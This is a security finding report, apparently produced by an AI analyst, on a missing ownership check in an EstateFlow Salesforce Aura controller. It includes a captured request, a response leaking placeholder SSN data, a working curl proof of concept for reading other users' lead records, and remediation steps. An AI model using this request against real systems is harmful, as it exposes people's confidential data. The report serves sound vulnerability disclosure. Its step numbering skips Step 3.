# Security Analysis Report
**System:** EstateFlow Property API (Real Estate / PropTech) — Salesforce-Integrated
**Classification:** SENSITIVE
**Analyst:** Security Analyst Co-Pilot
**Source:** SF-0017 context.txt (sole artifact)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BAC / Pattern 2.1 | Functional pivot — `LeadController.getLeadData` accessible with no ownership check, enables cross-user property lead data access |

---

## Finding 1 — Functional Pivot: Cross-User Lead Data Access via Aura Controller (CRITICAL)

### Summary
The `LeadController` Apex class on EstateFlow Property API (`220b1f52.lightning.force.com`) is declared `without sharing`, bypassing OWD=Private for Lead records. The `getLeadData` Aura action accepts a `leadId` from the client with no ownership validation. Per §5.0 Pattern 2.1, this represents a functional pivot: the attacker pivots from their own functional context (viewing their own leads) to a different function (accessing other agents'/users' property leads) using the same API action. The attacker supplies victim's record ID `0011F52` and receives their confidential property lead data and PII.

**Pattern:** 2.1 — Functional pivot (vertical/horizontal) (BAC)
**Affected controller:** `c.LeadController.getLeadData`
**Affected endpoint:** `POST https://220b1f52.lightning.force.com/aura`

### Evidence from HAR

**Request (attacker with valid session):**
```
POST https://220b1f52.lightning.force.com/aura HTTP/1.1
Authorization: Bearer 00D220B1F52!AR220b1f52...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00D220B1F52!AR220b1f52...

message={"actions":[{"id":"1;a","descriptor":"c.LeadController.getLeadData","callingDescriptor":"UNKNOWN","params":{"leadId":"0011F52","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}&aura.token=undefined
```

**Response (200 OK):**
```json
{
  "actions": [{
    "id": "1;a",
    "state": "SUCCESS",
    "returnValue": {
      "records": [{
        "Id": "0011F52",
        "Name": "Victim Lead Record",
        "OwnerId": "005VICTIM",
        "InternalNotes__c": "CONFIDENTIAL: internal review notes",
        "SensitiveData__c": "SSN: 000-88-1280"
      }]
    },
    "error": []
  }]
}
```

**`aura.token`:** `undefined` — no server-side Aura session validation.

The response exposes `SensitiveData__c: "SSN: 000-88-1280"` and `InternalNotes__c` for `OwnerId: "005VICTIM"`. In a real estate PropTech platform, Lead records contain property buyer/seller PII, financial qualification data, and agent commission information.

### Evidence Map

| Artifact Location | Field | Value | Significance |
|-------------------|-------|-------|--------------|
| §4.0 Apex code | `without sharing` | Class declaration | OWD=Private for Lead bypassed |
| §4.0 SOQL | No OwnerId predicate | Missing ownership check | Root cause |
| §5.0 Pattern 2.1 | Vulnerability | Functional pivot | Classification |
| HAR descriptor | `c.LeadController.getLeadData` | Aura action | Vulnerable entry point |
| HAR params | `leadId` | `0011F52` | Victim record ID |
| HAR params | `aura.token` | `undefined` | No Aura validation |
| HAR response | `OwnerId` | `005VICTIM` | Victim user |
| HAR response | `SensitiveData__c` | `SSN: 000-88-1280` | PII leaked |
| HAR response | `InternalNotes__c` | `CONFIDENTIAL: internal review notes` | Internal notes exposed |

### Steps to Reproduce

**Step 1 — Obtain valid Salesforce session:**
```bash
SF_TOKEN="00D220B1F52!AR220b1f52..."
```

**Step 2 — Call Aura controller with victim's leadId (VULNERABLE):**
```bash
curl -s -X POST "https://220b1f52.lightning.force.com/aura" \
  -H "Authorization: Bearer $SF_TOKEN" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "X-SFDC-Session: $SF_TOKEN" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.LeadController.getLeadData","callingDescriptor":"UNKNOWN","params":{"leadId":"0011F52","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined' \
  | python3 -m json.tool
# Expected VULNERABLE output: OwnerId=005VICTIM, SensitiveData__c=SSN: 000-88-1280
```

**Step 4 — Secure baseline (expected after fix):**
```bash
# Returns: {"actions":[{"state":"ERROR","error":[{"message":"Insufficient Privileges"}]}]}
```

### Remediation

1. **Add `with sharing` to Apex class:** `public with sharing class LeadController {`
2. **Add ownership SOQL predicate:** `WHERE Id = :leadId AND OwnerId = :UserInfo.getUserId()`
3. **Add `WITH SECURITY_ENFORCED`** to enforce field-level security.
4. **Validate `aura.token`:** Reject requests with undefined/invalid Aura token.
5. **Server-defined field allowlist:** Do not accept client-supplied `fields` parameter; define allowed field set server-side.
6. **PropTech compliance:** Real estate lead data is regulated under state privacy laws — ensure access logs for all Lead queries are maintained for audit.
